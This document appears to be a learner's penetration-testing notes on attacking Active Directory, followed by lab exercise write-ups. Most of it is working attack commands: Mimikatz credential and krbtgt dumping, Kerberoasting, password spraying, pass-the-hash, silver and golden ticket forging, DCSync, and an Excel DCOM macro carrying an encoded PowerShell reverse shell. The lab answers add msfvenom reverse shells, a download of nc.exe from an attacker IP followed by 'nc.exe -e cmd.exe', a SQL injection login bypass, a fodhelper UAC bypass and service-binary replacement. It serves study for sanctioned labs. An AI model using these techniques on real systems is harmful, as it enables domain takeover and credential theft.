# Chapter 21 - AD

## Theory

AD has several components, including the **domain controller**.

* **Domain Controller**: The most important one. Acts as the hub of all information traveling through AD and contains valuable information about the service.&#x20;
* **Domain**: Typically something that broadly contains everything, i.e. corp.com. There exist various types of objects, including computer and user objects.
* **Organizational Units**: Similar to file system folders, used to store other objects.&#x20;
* **Objects:** The meat of AD, including computer objects, which are actual computers, or user objects, with **attributes** like first name, last name, username, and password.

## Enumeration

In AD, administrators use groups to assign permissions to member users. Therefore, it follows that attacking high-value groups is the main focus.&#x20;

Another way to gain control is to compromise a domain controller and access domain-joined computers as well as view password hashes.

### Traditional Approach

```
C:\Users\Offsec.corp> net user /domain
The request will be processed at a domain controller for domain corp.com.


User accounts for \\DC01.corp.com

-------------------------------------------------------------------------------
adam                     Administrator            DefaultAccount
Guest                    iis_service              jeff_admin
krbtgt                   offsec                   sql_service
The command completed successfully.
```

This command allows us to enumerate all users in the entire domain. The **jeff\_admin** user looks valuable, we will focus on that user.

```
C:\Users\Offsec.corp> net user jeff_admin /domain
The request will be processed at a domain controller for domain corp.com.

User name                    jeff_admin
Full Name                    Jeff_Admin
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/19/2018 1:56:22 PM
Password expires             Never
Password changeable          2/19/2018 1:56:22 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

We can see that jeff\_admin is a member of the **Domain Admins** group.&#x20;

We can also enumerate all groups in a domain.

```
C:\Users\Offsec.corp> net group /domain
The request will be processed at a domain controller for domain corp.com.


Group Accounts for \\DC01.corp.com

-------------------------------------------------------------------------------
*Another_Nested_Group
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Nested_Group
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*Secret_Group
The command completed successfully.
```

We see **Secret\_Group**, which is of interest to us. Note **Nested\_Group** and **Another\_Nested\_Group**. In AD, you can put groups as a member to another group.

### Modern Approach

We can use PowerShell to enumerate AD.&#x20;

The script will query the network for the name of the primary domain controller emulator and the domain, search AD, and filter output.

We will need to use a **DirectorySearcher** object to query AD with **LDAP**, which is essentially an API that allows search functionality with AD. The script will use a very specific LDAP **provider path** that will be the input for DirectorySearcher.&#x20;

```
LDAP://HostName[:PortNumber][/DistinguishedName]
```

To create this path, we need:

* Hostname
* DistinguishedName

We can get both of these with a PowerShell command.

```
PS C:\Users\offsec.CORP> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()


Forest                  : corp.com
DomainControllers       : {DC01.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : DC01.corp.com
RidRoleOwner            : DC01.corp.com
InfrastructureRoleOwner : DC01.corp.com
Name                    : corp.com
```

This tells us that the domain name is "**corp.com**", from the Name field and the primary DC name is "**DC01.corp.com**" from the PdcRoleOwner field. We can use both of these to start our script.

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$SearchString
```

Note that domainObj holds the entire domain objetc, which PDC and DistinguishedName will hold their respective values. SearchString will look like the following:

```
LDAP://DC01.corp.com/DC=corp,DC=com
```

We can now instantiate the DirectorySearcher class with the LDAP path, as well as filter and clean up the output for the final script.

#### Final Script&#x20;

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}
```

We could change the Searcher.filter to something like "name=Jeff\_Admin" if we wanted to just enumerate them.

### Resolving Nested Groups

First we need to locate all the groups and print their names. This can be done by creating a filter for objectClass set to Group and printing the name property.&#x20;

Modified script:

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(objectClass=Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.name
}
```

When executed, the script lists all the groups.

Now, we can list the members of Secret\_Group:

```
...

$Searcher.filter="(name=Secret_Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.member
}
...
```

This outputs the names of DistinguishedName group members.

```
CN=Nested_Group,OU=CorpGroups,DC=corp,DC=com
```

Looks like Nested\_Group is a member of Secret\_Group. We can enumerate this group by changing the group name to Nested\_Group.

```
...
$Searcher.filter="(name=Nested_Group)"
...
```

```
CN=Another_Nested_Group,OU=CorpGroups,DC=corp,DC=com
```

We can now enumerate Another\_Nested\_Group with similar methodology.

```
...

$Searcher.filter="(name=Another_Nested_Group)"
...
```

```
CN=Adam,OU=Normal,OU=CorpUsers,DC=corp,DC=com
```

We can see that Adam is the only member.

### Currently Logged on Users

We want to find currently logged in users now, since we can find passwords or other loot in the cache and steal them.

<figure><img src=".gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

If we manage to compromise a Domain Admin, we have essentially compromised the whole domain. However, we can also compromise other accounts or machines. Note in the picture above that we can compromise Bob, then Alice, then Jeff.&#x20;

To discover any logged on users, we can use PowerView.

```
PS C:\Tools\active_directory> Import-Module .\PowerView.ps1
PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName client251 | Format-Table

wkui1_username wkui1_logon_domain wkui1_oth_domains wkui1_logon_server
-------------- ------------------ ----------------- ------------------
offsec         corp                                 DC01
offsec         corp                                 DC01
CLIENT251$     corp
CLIENT251$     corp
CLIENT251$     corp
CLIENT251$     corp
CLIENT251$     corp
CLIENT251$     corp
CLIENT251$     corp
CLIENT251$     corp 
```

We can retrieve active sessions as well.

```
PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01 | Format-Table

CName           UserName      Time IdleTime ComputerName
-----           --------      ---- -------- ------------
\\172.16.246.10 Administrator    8        0 dc01
```

The Adminstrator has an active session on the domain controller from 172.16.246.10, which is the Windows client. Now we can start compromising accounts.

### Enumeration Through Service Principal Names

Instead of attacking high values groups like the Domain Controller, we can target service accounts. &#x20;

When an application is executed, it will be done through an operating system user. However, services launched by the system use the context of a Service Account.&#x20;

This means that applications can use certain service accounts like **LocalSystem**, **LocalService**, and **NetworkService**.&#x20;

While certain applications are integrated into AD(i.e. SQL), a unique service instance identifier known as an SPN is used to associated services to their respective accounts.

Enumerating all registered SPNs can give us IP addresses and ports to servers integrated with AD.

Let's edit the script to include SPNs with the string http to check for web servers.

```
...
$Searcher.filter="serviceprincipalname=*http*"
...
```

This returns a large block of text.

```
Name                    Value     
----                    -----     
givenname               {iis_service}    
samaccountname          {iis_service}  
cn                      {iis_service}    
...
serviceprincipalname    {HTTP/CorpWebServer.corp.com} 
distinguishedname       {CN=iis_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp,DC=com   
...    
```

One of the attributes, samaccountname is set to iis\_service, which tells us there will likely be a web server. Furthermore, serviceprincipalname is set to HTTP/CorpWebServer.corp.com

## Authentication

### NTLM Authentication

NTLM Authentication is used when a client authenticates to a server by IP instead of hostname. The NTLM authentication protocol has 7 steps:

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

1. The client computer calculates a hash, referred to as the NTLM hash, from the user's password.
2. The client sends the username(stored in plaintext) to the server.
3. The client receives a **nonce** value from the server. The nonce value is randomized.
4. The client will encrypt the nonce with the NTLM hash and send that encryption, referred to as the "response" to the server.
5. The server will forward the username, nonce value, and the encrypted nonce to the Domain Controller.&#x20;
6. The Domain Controller then encrypts the nonce with the NTLM hash of the user(because it knows the NTLM hashes of all users)
7. It is now trivial to validate whether the response and value it encrypted are equal. If so, the authentication request is successful.

### Kerberos Authentication

While NTLM works by challenge and response, Kerberos uses a ticket system. At high level,s Kerberos client authentication to a service in AD uses a domain controller in the role of a key distribution center, or KDC.

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

1. When a user logs on, a request is send to the domain controller. This DC has the role of KDC and maintains the Authentication Server service. This request contains a time stamp that is encrypted use a hash from the username and password of the user.
2. When this is received by the domain controller, it attempts to decrypt the time stamp with the hash. If the decryption process is successful, the authentication is considered successful. It will send an Authentication Server Reply that contains a session key and a Ticket Granting Ticket(TGT). The Ticket Granting Ticket cannot be decrypted by the client.
3. If the user wants to access domain resources, such as a network share, Exchange mailbox, or another application with a registered SPN, it must contact the KDC. The client will generate a Ticket Granting Service Request packet that consists of the current user and timestamp(encrypted with the session key), the SPN of the resource, and the encrypted TGT. The ticket granting service on the KDC receives the request, and if the SPN exists, the TGT is decrypted using the secret key only known by the KDC.  The session key is extracted from the TGT and used to decrypt the username and timestamp of the request. The KDC then performs several checks:
   1. The TGT must have a valid timestamp
   2. The username from the request must match with the TGT
   3. The client IP address must coincide with the TGT IP address
4. If all checks are made, the service responds to the client with a ticket granting server reply packet, made of three parts. The first two parts are encrypted using the session key of creation of the TGT and the service ticket is encrypted using the password hash of the service account registered with the SPN in question.
   1. The SPN to which access has been granted
   2. A session key to be used between the client and the SPN
   3. A service ticket with username and group membership as well as the newly-created session key
5. Once authentication with the KDC is complete and the client has a session key and service ticket, it may continue with authentication. First, it needs to send an **application request**, which includes the username and timestamp encrypted with the session key associated with the service ticket along with the service ticket itself. The application server decrypts the service ticket and extracts the username and session key. It can now decrypt the username from the request and check if the two match.&#x20;
6. The user is authenticated.

### Cached Credential Storage and Retrieval

Password hashes must be stored somewhere to validate TGT requests. In current versions, these are stored in LSASS memory space. &#x20;

While data structures used to store these hashes are not publicly documented and encrypted, we can use Mimikatz to extract hashes from Windows 10. This must be run as a user with system privileges.

```
C:\Tools\active_directory> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

```

This should dump all password hashes.

&#x20;We can also use mimikatz to view tickets

```
mimikatz # sekurlsa::tickets
```

### Service Account Attacks

When a user wants to access a resources hosted by an SPN, the client requests a service ticket generated by the domain controller. The ticket is then decrypted and validated.&#x20;

However, no checks are performed on whether the user can access the service at all. Therefore, we can request a service ticket if we know the SPN and extract information from local memory and save it to disk. From PowerShell, we can create the ticket.

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```

After running, the requested service ticket should be generated and in the memory. We can use another command to display cached Kerberos tickets.

```
PS C:\Users\offsec.CORP> klist
Cached Tickets: (4)
...
#1>	Client: Offsec @ CORP.COM
	Server: HTTP/CorpWebServer.corp.com @ CORP.COM
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40a50000 -> forwardable renewable 
...
```

With the service ticket in memory, we can use mimikatz or built-in APIs. To download with mimikatz, we use the kerberos::list command, which does the same thing as the klist command. We can add the /export flag to download this to disk.

```
mimikatz # kerberos::list /export
...
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
   \* Saved to file     : 1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

According to the Kerberos protocol, the service ticket is encrypted using the SPN's password hash.  If we are able to request and decrypt using brute force or guessing(this is known as **Kerberoasting**), we will get the password hash.&#x20;

To break the hash, we can just use john.

```
kirbi2john ticket.kirbi > ticket.john
john --wordlist=passwords.txt --format=krb5tgs ticket.john
```

### Low and Slow Password Guessing

We can see that service accounts can be used to mount attack vectors from the Kerberos protocol, but AD can also provide information that can be used to guess passwords. When performing a brute force or wordlist attack, account lockouts are an inevitable issue that may alert system administrators.&#x20;

We will use LDAP and ADSI instead to perform a "low and slow" password attack against AD users without triggering an account lockout.

First, we need to see the account lockout threshold with the net.exe command to see how many failed logins we can attempt.

```
PS C:\Users\Offsec.corp> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

Note that after 5 failed logins we will be locked out, and we have 30 minutes between failed logins.

Therefore, we can attempt 4\*864/30= 192 logins within a 24 hour period.&#x20;

We can compile a short list of common passwords and use it agianst a massive amount of users, which could reveal weak links in the organization.

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")
```

This is brutally narrow, though, so we can use Spray-Passwords to check all the users.&#x20;

```
.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
```

## Active Directory Lateral movement

### Pass the Hash

Passing the Hash allows an attacker to authenticate with an NTLM hash. This does require local administrative rights on the target machine.

```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

Easy as that. Note that the value after Adminstrator% is the hash retrieved by mimikatz. The first value, aad3b435b51404eeaad3b435b51404ee, is a placeholder hash - we should only be concerned with the part after the colon.

### Overpass the Hash

Overpass the hash lets us "over" abuse a NTLM user hash to gain access to a full Kerberos Ticket Granting Ticket, which lets us access other machines or services as that user.

An overpass the hash technique's main goal is to convert an NTLM hash into a kerberos ticket and avoid authentication. One way is using Mimikatz.

```
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe
```

That will launch a PowerShell instance, and we can check if we are able to generate TGTs.

```
PS C:\Windows\system32> net use \\dc01
The command completed successfully.

PS C:\Windows\system32> klist

Current LogonId is 0:0x1583ae

Cached Tickets: (3)
...
```

This indicates that the net use command was successful. Now, we changed the NTLM hash to a TGT, and thus we can use PsExec to launch cmd.exe remotely on the \dc01 machine as Jeff\_Admin.

```
.\PsExec.exe \\dc01 cmd.exe
```

### Pass the Ticket

In the previous section, we used the overpass the hash technique to acquire a Kerberos TGT. However, we can only use the TGT on the machine it was created for, but a TGS can offer more flexibility.

The **Pass the Ticket** attack uses the TGS, which can be exported and injected anywhere in the network to authenticate to a specific service.&#x20;

Note that this requires local administrative rights on the target machine, just like Pass the Hash.

Recall that the application on the server executing in the context of the service account checks the user's permissions from the group memberships in the service tickets. However, the user and group permissions are not verified.&#x20;

If we authenticate against an IIS server that is executing in the context of the service account iis\_service, the IIS application will determine which permissions we have on the IIS server based on the group memberships.

However, with the service account password or it's hash, we can make a bogus service ticket to access it's resource with any permissions we want. This is referred to as a **silver ticket**.

Mimikatz can craft a silver ticket and inject it into memory through the **kerberos::golden** command.&#x20;

To create a ticket, we need the security identifier or SID of the domain. It has the following structure:

```
S-R-I-S
```

The SID is composed with the letter "S" followed by a revision level(often 1), identifier-authority value(often 5 in AD) and one or more subauthority values.

```
S-1-5-21-2536614405-3629634762-1218571035-1116
```

We can easily obtain the SID of our current user and extract the domain SID part from it.

```
C:\Windows\system32>whoami /user

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
corp\offsec S-1-5-21-4038953314-3014849035-1274281563-1103
```

The string "S-1-5-21-4038953314-3014849035-1274281563" will be the domain SID. Note that I omitted 1103 as that is the specific object identifier.

```
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /ptt
```

Now we can interact with the service and gain access to any information based on the group memberships we put in the silver ticket.

### Distributed Component Object Model

The Microsoft Component Object Model is a system for creating software components that interact with each other.&#x20;

DCOM allows lateral movement through use of Outlook and PowerPoint. This is best against workstations. We will use the Excel.Application DCOM object.

To start, we must first discover the available methods for this DCOM object.&#x20;

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.193.10"))

$com | Get-Member
```

Then, we will open an Excel document and make a macro called mymacro.

```
Sub mymacro()
    Shell ("notepad.exe")
End Sub
```

We can now use the Copy method and send it to the SMB file share as well as execute it.

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
```

This will open the notepad application. However, we can take this further with a reverse shell.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.193.10 LPORT=4444 -f hta-psh -o evil.hta
```

We will need to convert this into smaller chunks with python and update the macro.

```
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```

```
Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    ...
    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
    Shell (Str)
End Sub
```

Now if we run the ps1 file from before and set up a netcat listener we should be able to accept the shell.

## Active Directory Persistence

### Golden Tickets

Recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This is the password hash of a domain user account called **krbtgt**.

If we can get the krbtgt hash, we can create our own self made TGTs, known as **golden tickets**.&#x20;

We can try to laterally move from the Windows 10 workstation to the domain controller with psexec. However, this will not work, as we do not have proper permissions.

```
psexec.exe \\dc01 cmd.exe
```

Instead, we can extract the password hash of the krbtgt account with mimikatz.&#x20;

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : e2b475c11da2a0748290d87aa966c327

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 75b60230a2394a812000dbfad8415965
...
```

Now, we can forge the golden ticket.

```
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
```

Note the SID was obtained with the whoami /user command.

Now, we can attempt lateral movement with PsExec.

```
mimikatz # misc::cmd
C:\Users\offsec.corp> psexec.exe \\dc01 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


C:\Windows\system32>
```

Note that if we tried to connect using PsExec to the IP address instead of the hostname, we would force usage of NTLM authentication and access would be blocked.

### Domain Controller Synchronization

Another way to achieve persistence is by stealing the password hashes of all admins in the domain.&#x20;

```
mimikatz # lsadump::dcsync /user:Administrator
```

## Practice - Active Directory Attacks I

### Question 1

Enumerate all the domains and find a DNS lookup webpage on the 192.168.xxx.58 IP. We can then inject command into the search bar with the & operator.&#x20;

<figure><img src=".gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

&#x20;It is then possible to upload a reverse shell using a python web server and powershell on the target machine.

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.193/nc.exe', 'nc.exe')
```

Then, we can finalize the reverse shell with a netcat listener and send the shell.

```
nc.exe 192.168.45.193 9001 -e cmd.exe
```

We can then read the flag.

### Question 2

Redo the steps above and get mimikatz on the target machine. Look in the cache for passwords and find Nathan, a domain user, with the password abc123//.&#x20;

RDP into the 192.168.xxx.59 machine with the credentials and domain OFFSEC to get the flag.

### Question 3

We will need to run the script first to see what SPNs there are on this network.&#x20;

```
...
$Searcher.filter="serviceprincipalname=*"
...
<OUTPUT>
Allison                                                                                                              
DC01                                                                                                                 
APPSRV01                                                                                                             
CLIENT01                                                                                                             
krbtgt
```

Recall that from our `net user /domain` command we saw the following users:

```
-------------------------------------------------------------------------------
Administrator            Allison                  Guest                     
krbtgt                   Nathan
```

It's strange that we have Allison in the SPN listing and user list. This should tip us off that Allison is likely the user we are looking for.

We can then make a ticket.

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'Allison'
```

Then, we'll list the tickets with `klist` and export them in Mimikatz with `kerberos::list /export`.&#x20;

Crack the hash to get the cleartext password of **RockYou!**.

Now, we can use impacket-psexec.

```
./impacket-psexec offsec.local/Allison:RockYou'!'@192.168.223.59
```

### Question 4

Let's start off by logging into Allison's account with the password obtained before and dump client01's hashes. I used impacket-secretsdump.py here, but reg save is also a possible option. I couldn't get the file to work with samdump2, though.

```
python secretsdump.py offsec.local/allison@192.168.209.59
...
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

Password:
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x8083a99d1e5064d3bab801bc951c6fea
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:97eb2768602642d58b10db2d26caff8a:::
[*] Dumping cached domain logon information (domain/username:hash)
...
```

And we've obtained the Administrator hash. Now we can access the dc01 machine with a "pass the hash" attack and get the flag.

```
python psexec.py "Administrator":@192.168.209.57 -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5
```

## Practice - Active Directory Attacks II

### Question 1

In this vm group, we are greeted with a login page on the 192.168.xxx.171 IP, and a quick SQL injection yields another webpage that has a url submission form.

Username & Pass: ' or '1'='1

At this URL submission form, we can try a variety of file types to attempt a reverse shell upload, but we eventually see that hta will work. This is useful because we can use msfvenom to generate reverse shell scripts. It isn't all guesswork for hta, since it is a good guess when dealing with Windows web servers.

By uploading the reverse shell generated:

```
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.146 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```

We can open a netcat listener and receive the shell.

Once you have the shell, you are the exam/ted user. Interestingly enough, you can read the flag file already, but it is important for us to utilize priv esc so we can advance with the penetration test.&#x20;

#### Privilege Escalation

Remember fodhelper.exe? We can utilize that again to bypass UAC here. I can check this by uploading sigcheck64.exe to the box and looking at the permissions on the program.

Notably,

```
<requestedExecutionLevel
           level="requireAdministrator"
/>
```

And

```
<autoElevate>true</autoElevate>
```

We can use the registry keys fodhelper tries to access and add a shellcode generated by msfvenom again to spawn another reverse shell, this time with elevated privileges.

```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\ted\Desktop\revshell.exe" /f
...
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.146 LPORT=1234 -f exe -o revshell.exe
```

Open the netcat listener and we are done.

Post-Completion notes:&#x20;

We can launch mimikatz and harvest ted's password, which is avatar123, and rdp into the machine at the 192.168.xxx.172 ip. Now we can move onto question 2.

### Question 2

We already did all the heavy lifting by dumping the passwords for ted, we can just RDP into the 171 IP and read the flag.

### Question 3

We can import the script PrivescCheck.ps1 from [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck) and run it to see that there is binary vulnerability, specifically regarding zen.exe.

```
| KO | High | SERVICES > Binary Permissions -> 8 result(s)                    |
| KO | Med. | UPDATES > System up to date? -> 1 result(s)                     |
```

We can scroll up and see what's so special about these binary permissions.

```
Name              : Service1
ImagePath         : C:\program files\zen\zen services\zen.exe
User              : zensvc@exam.com
ModifiablePath    : C:\program files\zen\zen services
IdentityReference : BUILTIN\Users
Permissions       : WriteAttributes, Synchronize, AddSubdirectory, WriteExtendedAttributes, AddFile
Status            : Stopped
UserCanStart      : False
UserCanStop       : False

Name              : Service1
ImagePath         : C:\program files\zen\zen services\zen.exe
User              : zensvc@exam.com
ModifiablePath    : C:\program files\zen\zen services\zen.exe
IdentityReference : BUILTIN\Users
Permissions       : WriteAttributes, Synchronize, AppendData, WriteExtendedAttributes, WriteData
Status            : Stopped
UserCanStart      : False
UserCanStop       : False
```

What's so interesting about this zen.exe file is that we can basically edit the zen.exe file or add a reverse shell in there. However, it's useless without a way to activate it.

```
C:\Users\ted>sc qc Service1
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: Service1
TYPE               : 10  WIN32_OWN_PROCESS
START_TYPE         : 2   AUTO_START  (DELAYED)
ERROR_CONTROL      : 1   NORMAL
BINARY_PATH_NAME   : C:\program files\zen\zen services\zen.exe
LOAD_ORDER_GROUP   :
TAG                : 0
DISPLAY_NAME       : ZenHelpDesk
DEPENDENCIES       :
SERVICE_START_NAME : zensvc@exam.com
```

With this, we can see that the service/process is auto start on machine boot, but it's slightly delayed. Therefore, I can alter the zen.exe file to a reverse shell, reboot the machine, and wait until I get a shell callback.

```
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.213 LPORT=4444 -f exe -o /var/www/html/zen.exe
```

A simple msfvenom command and I'm able to get the flag.

